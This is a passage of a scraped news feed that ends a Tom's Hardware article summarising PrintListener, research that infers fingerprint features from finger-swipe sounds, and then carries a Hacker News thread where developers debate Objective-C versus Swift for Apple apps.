is some complicated science behind the inner workings of PrintListener, but if you have read the above, you will already have a good idea about what the researchers did to refine their AFIS attacks. However, three major challenges were overcome to get PrintListener to where it is today:</p><ul><li>Faint sounds of finger friction: a friction sound event localization algorithm based on spectral analysis was developed.</li><li>Separating finger pattern influences on the sound from a users’ physiological and behavioral features. To address this the researchers used both minimum redundancy maximum relevance (mRMR) and an adaptive weighting strategy</li><li>Advancing from the inferring of primary to secondary fingerprint features using a statistical analysis of the intercorrelations between these features and design a heuristic search algorithm</li></ul><div aria-hidden="false" data-swipeable="true" data-hydrate="true" id="slice-container-imageGallery-waWmktPvJGi2qvhMkJLruF-4"><figure data-bordeaux-image-check="false"><div data-hydrate="true"><p><img src="https://vanilla.futurecdn.net/cyclingnews/media/img/missing-image.svg" alt="PrintListener"></p></div><figcaption><span itemprop="copyrightHolder">(Image credit: Huazhong University, Wuhan University, Tsinghua University,  University of Colorado Denver)</span></figcaption></figure></div><p>To prove the theory, the scientists practically developed their attack research as PrintListener. In brief, PrintListener uses a series of algorithms for pre-processing the raw <a data-analytics-id="inline-link" href="https://www.tomshardware.com/tech-industry/artificial-intelligence/audacity-gets-ai-transcription-and-noise-suppression-courtesy-of-intel-openvino-plug-ins" data-before-rewrite-localise="https://www.tomshardware.com/tech-industry/artificial-intelligence/audacity-gets-ai-transcription-and-noise-suppression-courtesy-of-intel-openvino-plug-ins">audio signals</a> which are then used to generate targeted synthetics for PatternMasterPrint (the MasterPrint generated by fingerprints with a specific pattern).</p><p>Importantly, PrintListener went through extensive experiments “in real-world scenarios,” and, as mentioned in the intro, can facilitate successful partial fingerprint attacks in better than one in four cases, and complete fingerprint attacks in nearly one in ten cases. These results far exceed unaided MasterPrint fingerprint dictionary attacks.</p>
</div>
<div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent-waWmktPvJGi2qvhMkJLruF"><section><p>Join the experts who read Tom's Hardware for the inside track on enthusiast PC tech news — and have for over 25 years. We'll send breaking news and in-depth reviews of CPUs, GPUs, AI, maker hardware and more straight to your inbox.</p></section></div>
<div id="slice-container-authorBio-waWmktPvJGi2qvhMkJLruF"><p>Mark Tyson is a Freelance News Writer at Tom's Hardware US. He enjoys covering the full breadth of PC tech; from business and semiconductor design to products approaching the edge of reason.</p></div>



<!-- Drop in a standard article here maybe? -->


</section>





<div id="slice-container-relatedArticles"><p><h5>Most Popular</h5></p></div>








</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: How many of you Apple developers still use Objective C? (143 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=39442296</link>
            <guid>39442296</guid>
            <pubDate>Tue, 20 Feb 2024 15:18:50 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=39442296">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <tbody><tr id="39442874"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442874" href="https://news.ycombinator.com/vote?id=39442874&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I use Objective-C exclusively (no Swift) in my App Store apps.<p>I wrote a Swift app for a hobby/free project a few years ago and regretted it. They changed the language and deprecated some of my code, which isn't easily replaceable without a significant rewrite. The project now compiles only in Swift 4 and will die when Swift 4 support is removed from Xcode.</p><p>I see no reason to use Swift. The compiler is slower and buggier. The debugger is slower and buggier. C interoperablity, while it exists in Swift, can be very painful. And I don't actually ship any bugs that Swift could have theoretically saved me from. I see no gain in switching.</p><p>People have been telling me since 2014 that every line of code I write in Objective-C is "technical debt". I continue to laugh at them and ask them to compile Swift code they wrote in 2014.</p><p>Of course if I had to get a job, it would be a different story, but I own my company, so I can do whatever I want.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39443753"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443753" href="https://news.ycombinator.com/vote?id=39443753&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>As a counter-anecdote from someone who also runs their own company, I began dabbling in Swift in 2014. I held off on full Swift adoption until after the big API renaming that happened with Swift 3, so language migrations haven’t been a big deal. The compiler is slower, but I can still do a clean build in 43 seconds.<p>Maybe I’ve had a good experience because I’m not working on a FAANG project with a million lines of code, but that’s all to say there are shades of grey, and you have to consider what you get in exchange for Swift’s compiler and evolution overhead.</p><p>Personally, I’ve found Swift helps avoid entire categories of bugs that crop up in ObjC, like accidental nil messaging. Generics have allowed me to avoid duplicate implementations. Now SwiftUI has allowed me to implement things in hours what would have taken me days in UIKit. I could go on for a while, but those are off the top of my head.</p><p>If you find yourself enjoying ObjC, by all means keep using it. Or C. Or Pascal. Or Lisp. There are tons of different ways to accomplish the same thing, but that doesn’t account for extra-hours and bugs it takes to get there.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39444737"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_39444737" href="https://news.ycombinator.com/vote?id=39444737&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; If you find yourself enjoying ObjC, by all means keep using it. Or C.<p>I didn't say I enjoyed ObjC. That's not really how I choose my tools. It's a job. The choice is utilitarian.</p><p>&gt; Or Pascal.</p><p>I seem to recall enjoying Pascal somewhat, though that was a very long time ago.</p><p>&gt; Or Lisp.</p><p>I definitely recall <i>not</i> enjoying Lisp. Not at all. Yuck.</p><p>&gt; that doesn’t account for extra-hours and bugs it takes to get there.</p><p>If Swift helps you, that's great. I'm just writing about my experience. For me, it doesn't help. I'm certainly not deliberately avoiding a tool that would help me. I do write my share of bugs, but I rarely write the type of bugs that the Swift compiler would catch, and I never ship them. YMMV</p><p>I'm not intending to offer <i>advice</i> of any kind to others. I'm not much for giving or taking advice. And like I suggested, if I needed to find a job, then I'd probably have to go all-in on Swift. My goal, though, is to never get another job for the rest of my life. ;-)
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39445460"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_39445460" href="https://news.ycombinator.com/vote?id=39445460&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; I didn't say I enjoyed ObjC. That's not really how I choose my tools. It's a job. The choice is utilitarian.<p>Given C is faster and more mature than ObjC, why aren’t you writing everything in pure C and objc_msgSend?
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39445748"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_39445748" href="https://news.ycombinator.com/vote?id=39445748&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; Given C is faster and more mature than ObjC, why aren’t you writing everything in pure C and objc_msgSend?<p>TBH your question feels trollish, but I'll respond anyway.</p><p>Objective-C code does compile to objc_msgSend calls. Perhaps you meant getting the method implementations directly and calling them instead?</p><p>Objective-C is 40 years old. How much more mature does it need to be?
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39445936"><td><table>  <tbody><tr>    <td indent="5"><img src="https://news.ycombinator.com/s.gif" height="1" width="200"></td><td>
      <center><a id="up_39445936" href="https://news.ycombinator.com/vote?id=39445936&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>You said you make the utilitarian choice. By using C everywhere, you can use an even faster compiler that doesn’t insert those calls for you. So why don’t you?</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39446075"><td><table>  <tbody><tr>    <td indent="6"><img src="https://news.ycombinator.com/s.gif" height="1" width="240"></td><td>
      <center><a id="up_39446075" href="https://news.ycombinator.com/vote?id=39446075&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; By using C everywhere, you can use an even faster compiler that doesn’t insert those calls for you.<p>In the previous comment you said I should use objc_msgSend, now you say I shouldn't. Make up your mind. ;-)</p><p>Anyway, I'm using AppKit and UIKit to write apps. The API is Objective-C. That's why I write Objective-C.</p><p>Whatever the heck you're talking about—you appear to be confused, so I don't know what exactly you mean technically—it certainly sounds like premature optimization, which is a waste of time and not the correct utilitarian choice. My Objective-C code is not "slow". Could it be infinitesimally "faster" in way that's not even perceivable by the user? Perhaps, but who cares?
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39446758"><td><table>  <tbody><tr>    <td indent="7"><img src="https://news.ycombinator.com/s.gif" height="1" width="280"></td><td>
      <center><a id="up_39446758" href="https://news.ycombinator.com/vote?id=39446758&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; Whatever the heck you're talking about—you appear to be confused, so I don't know what exactly you mean technically—it certainly sounds like premature optimization, which is a waste of time and not the correct utilitarian choice.<p>You’re right, I’m confused. You just said joy does not play a role in your choices. It sounds like one-minute builds are too slow for you. So why not copy and paste those message sends? You might very well shave a second or two off your build times.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                                                <tr id="39446382"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39446382" href="https://news.ycombinator.com/vote?id=39446382&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>former Mac dev here, and completely agreed. Refactoring an app because someone else decided to change the language is a bridge to far. And if they do it this time, they'll do it again. Meanwhile the ObjC compiles.<p>---
Rant - With Swift Apple shifted dev power to themselves. Having gotten fat on the open world, they've backed away from every 'Open' technology they can, and replaced it with their own, ( presently all the way to CPU architecture).
  Yes, they are giving tremendous powers, but have they also crafted the One Ring.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443478"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443478" href="https://news.ycombinator.com/vote?id=39443478&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>After years of obj-c I wrote a rather larger app on Swift 1.1. I'll never forget the pain of upgrading to each new version of Swift. And my god, the pain of early swift string manipulation. 100% technical debt annually.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39444134"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_39444134" href="https://news.ycombinator.com/vote?id=39444134&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>If there’s one lesson to take from Swift 1 and 2, it’s that Apple is comfortable launching beta APIs that can undergo massive churn. It’s why I avoided SwiftUI for the first few years, and now why people would be wise to do the same for SwiftData.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39445918"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_39445918" href="https://news.ycombinator.com/vote?id=39445918&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Same with Google. When they announced that Compose was now "stable" I laughed out loud and said "they just slapped a 1.0 version on it, didn't they?". And yes they did. We're a lot of releases later and it's still no fun to debug weird-ass issues. Last week I had two textfields, and both of them had focus at the same time!</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39444447"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_39444447" href="https://news.ycombinator.com/vote?id=39444447&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; Apple is comfortable launching beta APIs that can undergo massive churn<p>You see this as a consumer, too. Apple very much moves on from old hardware compared to Microsoft.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                        <tr id="39443413"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443413" href="https://news.ycombinator.com/vote?id=39443413&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>absolutely the same here.<p>the problem with Swift is that it is a systems programming language and not an app-development language. far to cumbersome, complicated and unproductive for writing apps.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39443999"><td></td></tr>
                <tr id="39446669"><td></td></tr>
                        <tr id="39443332"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443332" href="https://news.ycombinator.com/vote?id=39443332&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; C interoperablity, while it exists in Swift, can be very painful<p>Interesting, that hasn't been my experience. I'm curious, what have you ran into that was painful?
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39446139"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_39446139" href="https://news.ycombinator.com/vote?id=39446139&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>If I recall correctly you have to make a separate module with the bridging headers, but the first problem is that I can't remember exactly of the syntax of that file.<p>The second is that it's a lot of code and files to make when we only have one import to hack something quickly. For a full library it's probably a very cool feature though.</p><p>The third one is more related to my use case. I made a binding with a non-C codebase, and Swift cannot directly import C functions AFAIK, so I had to write C code in addition to the Swift one to make headers. It's not impossible, but it does take time to write all of that in a third programming language.</p><p>The fourth problem is related to library imports. In SPM, you either import a system library, or an xcframework. If your app targets any non-Apple platform, xcframeworks are not an option, so if you made a binding to your own lib that's annoying as it is probably not installed while you're building. And even if you're targeting Apple platforms, making an xcframework without Xcode is not well documented.</p><p>I probably missed a few problems as my experience is not very extensive, and there are probably better ways to achieve some of the things I wanted to do, but there isn't much documentation about all of that online anyway as far as I saw.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443374"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_39443374" href="https://news.ycombinator.com/vote?id=39443374&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I'm not op and it's been many years since I tried but back in the early days of Swift interop with C worked great until it didn't and it was very difficult to figure out what was going on because the debugger might as well have not existed.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39443438"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_39443438" href="https://news.ycombinator.com/vote?id=39443438&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>Not aimed at you particularly, but I've noticed more and more of the technical discussion on HN turn into "I don't really use it, but here's my many years old experience / non-user observation", which is mostly just confusing to people trying to leadn.<p>You don't need to justify op with old anecdotes, people want to know what the issues are today, if any. At least that's what makes this website valuable for me.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39443638"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_39443638" href="https://news.ycombinator.com/vote?id=39443638&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>Do you expect people to periodically repeat failed experiments just so they can provide you with up to date information? You are always free to ignore it.<p>In any case, this particular observation is timeless: language bridges always have trolls under them. Maybe your project can get away with using the bridge anyway, but maybe a highly critical API gets locked out because the bridge deals poorly with variadic arguments or object lifetimes or templates/generics or nested objects or latency/overhead assumptions or.... whatever, and the troll conks your schedule on its head. Try to minimize exposure and prioritize steps to de-risk the bridge.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443483"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_39443483" href="https://news.ycombinator.com/vote?id=39443483&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Definitely makes sense. In defense of the previous comment I made though, the debugger is only marginally better than when Swift first came out. That's regardless of whether or not you're interoping with C. It's still a terrible experience compared to what Obj-C provided.</span></p></div></td></tr>
        </tbody></table></td></tr>
                        <tr id="39443458"><td></td></tr>
                  <tr id="39443144"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443144" href="https://news.ycombinator.com/vote?id=39443144&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>You’ll have an increasingly harder time adopting new Swift-only APIs<p>For example OCR - you can use the old low quality Vision API but the new ImageAnalyzer can’t be accessed via ObjC and requires custom bridging. More and more new APIs will be Swift exclusive
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39443276"><td></td></tr>
                <tr id="39446685"><td></td></tr>
            <tr id="39444078"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_39444078" href="https://news.ycombinator.com/vote?id=39444078&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>In these cases I like to use the malaphor <i>we'll burn this bridge when we get to it</i> :) Because that's how these changes feel like.</span></p></div></td></tr>
        </tbody></table></td></tr>
                              <tr id="39443291"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443291" href="https://news.ycombinator.com/vote?id=39443291&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I've given up on Apple platform development, but I strongly prefer Objective-C over Swift for a variety of reasons, including elegance, compatibility, stability, etc.<p>It's important to note that there's still tons of Objective-C written inside Apple to this day, perhaps more than Swift.</p><p>What Apple pushes as what you <i>should</i> be using is often not what they are using internally, FWIW. Third-party developers are its true beta testers.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39446475"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39446475" href="https://news.ycombinator.com/vote?id=39446475&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>You could probably say the same about most large public orgs. For instance many Amazon teams don't even use modern AWS internally for their services. At least as of three years ago.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39446601"><td></td></tr>
                  <tr id="39444243"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39444243" href="https://news.ycombinator.com/vote?id=39444243&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>Elegance. I keep hearing that from obj-c devs and I really don’t understand what is so elegant about it. Maybe it’s more to do with familiarity? I find swift much easier to deal with and more “elegant” to read.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39446615"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_39446615" href="https://news.ycombinator.com/vote?id=39446615&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>It's subjective, but from my viewpoint, the message passing and it's relative simplicity and readability, compared to Swift.<p>I can completely see why people would think the opposite, though.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39445565"><td></td></tr>
                  <tr id="39444547"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39444547" href="https://news.ycombinator.com/vote?id=39444547&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; It's important to note that there's still tons of Objective-C written inside Apple to this day, perhaps more than Swift.<p>I don’t know if this is true or not, but Apple certainly isn’t writing its own end-user applications with good macOS technologies and support (which means it’s not using Objective C and Cocoa). Apps like Reminders, Notes, Photos and others on macOS seem and behave like poorly ported versions of an iOS app.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="39442550"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442550" href="https://news.ycombinator.com/vote?id=39442550&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>While all of our app are almost entirely Swift and Metal,  I’d say it’s still invaluable to be proficient in Objective-C, given how relatively little investment it takes to understand.<p>Sometimes an old code sample is only available in ObjC. Sometimes you need to interop with a legacy API that wasn’t bridged cleanly. Sometimes it’s helpful to fiddle at runtime in debugging.</p><p>It’s kind of like how you probably shouldn’t write C nowadays, but C is still an important language every developer should be able to navigate.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39442452"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442452" href="https://news.ycombinator.com/vote?id=39442452&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I had a weird relationship with ObjC getting into iOS in 2016, just on the cusp of the great renaming of Swift 2 to Swift 3, where my first employer was a little too cheap to get me an updated Big Nerd Ranch guidebook.<p>The common wisdom was; nobody will take you seriously as an engineer unless you learn Objective-C. I was also trying to understand the book "High Performance iOS Apps", all in ObjC, so had to take a lengthy segue through an ObjC tutorial book.</p><p>While this was useful for expanding my horizons somewhat, I have never in my career had to use ObjC in production.</p><p>I have, however, used it a little in the last 6 months, though ironically this was when writing a blog post about Apple's Animation APIs through history - to ensure I was authentic, I wrote the Quartz, OpenGL, and CoreAnimation sections in Objective-C. To this date, this is the only ObjC I have written which has done anything of value.</p><p>The blog post is here - <a href="https://jacobbartlett.substack.com/p/through-the-ages-apple-animation" rel="nofollow">https://jacobbartlett.substack.com/p/through-the-ages-apple-...</a> 
The GitHub project is here (all open source!) - <a href="https://github.com/jacobsapps/animation-through-the-ages">https://github.com/jacobsapps/animation-through-the-ages</a>
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39446723"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39446723" href="https://news.ycombinator.com/vote?id=39446723&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>The big question today is could someone new to Mac/iOS get started with Obj-C with all of the modern kit and documentation (seemingly, not having done an extensive audit) to be Swift based.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39446701"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39446701" href="https://news.ycombinator.com/vote?id=39446701&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>Oh Objective-C, such a weird language. If you know how to use it you are a wizard on the Mac. I think its days are numbered however, no one is extending it and Swift is coming to take over.<p>Also, I hate it.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443354"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443354" href="https://news.ycombinator.com/vote?id=39443354&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I work on an app that pre-dates Swift by a year. At this point I'd say about 60-70% of the app is in Swift but there's still large chunks of core functionality that's obj-c. It's mostly stable though and we don't work in that part of the codebase very regularly. It's been a few years since we made any noteworthy modifications to it.<p>My previous job was all Obj-C at a fairly large and well known company. When I left in 2019 they were beginning to experiment with adding Swift.</p><p>I started coding iOS apps around version 5 which was right before the addition of ARC. I've grown to miss the simplicity of Obj-C and have a love/hate relationship with Swift but likely in a few years there won't be much of it left except at big companies who have very old apps.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39442778"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442778" href="https://news.ycombinator.com/vote?id=39442778&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>Modern Objective-C with ARC is fairly painless, especially compared to the Objective-C of yore. And if you are doing macOS-specific work for a C/C++ codebase, it's still simpler to integrate than Swift is.<p>Method swizzling is also an important tool for any aspiring macOS developer, unavailable/onerously painful in Swift.</p><p>All in all, I don't think there's anything wrong with continuing to write new things in modern Obj-C as long as you're conscious of the tradeoffs and interoperability is a concern.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39443856"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443856" href="https://news.ycombinator.com/vote?id=39443856&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; Method swizzling is also an important tool for any aspiring macOS developer, unavailable/onerously painful in Swift.<p>I use swizzling in Swift. Can't see why it's more painful than in Objective-C.
It's also not something you do all the time. It's basically write once code for me.</p><p>Funny enough I mostly use it so swizzle UIViewController lifecycle methods and then just pass closures in instead of subclassing UIViewController. Yes, I don't subclass UIViewController and haven't for years and years. (I mostly don't subclass that much nowadays - take that Objective-C!)
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                  <tr id="39442564"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39442564" href="https://news.ycombinator.com/vote?id=39442564&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I am an iOS developer and I haven't used ObjC in over five years. There probably isn't any reason to start a new app or library with anything other than Swift. So it's just going to depend on the legacy code base.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="39442821"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39442821" href="https://news.ycombinator.com/vote?id=39442821&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>I agree there's no good reason to write new (iOS) stuff in ObjC now days, but you're likely to still encounter plenty of ObjC if you're maintaining old projects.<p>Interoperability between Swift and ObjC works really well for the most part, so I tend to write any <i>new</i> files/modules in Swift, and older apps end up being a hybrid of both. I rarely see justification in rewriting existing ObjC code in Swift unless the code needs a rewrite anyway.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="39443635"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_39443635" href="https://news.ycombinator.com/vote?id=39443635&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>&gt; There probably isn't any reason to start a new app or library with anything other than Swift.<p>Unless you do anything for MacOS and care about MacOS. Most Swift UI apps I've seen feel foreign on MacOS in innumerable ways.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="39444361"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_39444361" href="https://news.ycombinator.com/vote?id=39444361&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>You can use AppKit in Swift just like you can use UIKit on iOS. There is no requirement to use SwiftUI when creating a macOS swift app.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443842"><td></td></tr>
                <tr id="39444033"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_39444033" href="https://news.ycombinator.com/vote?id=39444033&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><p><span>Since Swift UI is iOS-first, when the apps get ported to MacOS, they bring a lot of mobile-isms: the views and animations are often wrong, the controls are often wrong (like even the Apple's own settings app breaks <i>a lot</i> of established platform conventions and Apple's own HIGs), integration with system services is often incomplete (like proper keyboard shortcuts, I can't set a shortcut for Conversations-&gt;Delete in Messages anymore) etc.<p>Because of that I've seen people discuss that they have to reach for AppKit and/or ditch SwiftUI and got all in with AppKit, and that is easier to do from Obj-C.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                              <tr id="39443602"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_39443602" href="https://news.ycombinator.com/vote?id=39443602&amp;how=up&amp;goto=item%3Fid%3D39442296"></a></center>    </td><td><br><div>
                  <p><span>I've been programming for 56 years.  Over that time if I had changed languages without a compelling reason, it would have been a huge waste of time, energy, and peace of mind.  I'll stick with objC until I am compelled by practical reasons to change.</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="39443183"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
